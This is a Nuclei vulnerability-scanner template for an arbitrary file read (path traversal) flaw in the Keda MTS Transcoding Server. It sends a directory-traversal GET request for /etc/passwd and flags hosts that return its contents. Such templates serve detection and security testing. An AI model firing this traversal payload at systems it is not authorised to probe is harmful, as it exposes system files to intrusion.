id: poc-keda-mts-anyfile-read
info:
  name: "Keda MTS Transcoding Server 任意文件读取漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: Keda
http:
  - method: GET
    path:
      - "{{BaseURL}}/../../../../../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:"
          - "/bin"
      - type: word
        words:
          - "<"
        negative: true
